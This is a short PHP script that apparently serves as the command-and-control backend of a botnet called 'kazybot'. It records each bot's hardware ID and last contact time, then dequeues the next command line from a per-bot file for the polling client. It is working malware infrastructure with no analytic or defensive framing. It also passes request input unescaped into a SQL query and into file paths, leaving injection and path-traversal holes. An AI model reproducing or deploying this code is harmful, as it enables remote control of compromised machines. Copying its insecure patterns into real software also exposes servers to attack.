<?php
require_once("settings.php");
$ret = "";
foreach(explode("|", $_REQUEST['HWID']) as $hwid)
{
if(isset($_REQUEST['SERVER']))
	mysqli_query($sql, "UPDATE kazybot SET LAST=NOW() WHERE HWID='" . $hwid . "'");
if(file_exists("data/" . $hwid . ".dat"))
{
	$file = fopen("data/" . $hwid . ".dat", "r+");
	flock($file, LOCK_EX);
	$size = filesize("data/" . $hwid . ".dat");
	if($size > 0)
	{
		$content = fread($file, $size);
		$index = strpos($content, "\n");
		if(!isset($_REQUEST['SERVER']))
			$ret .= $hwid . "|" . substr($content, 0, $index) . "|";
		else
			$ret .= substr($content, 0, $index);
		rewind($file);
		ftruncate($file, 0);
		fwrite($file, substr($content, $index + 1, strlen($content) - $index));
	}
	fclose($file);
}
}
echo $ret;
?>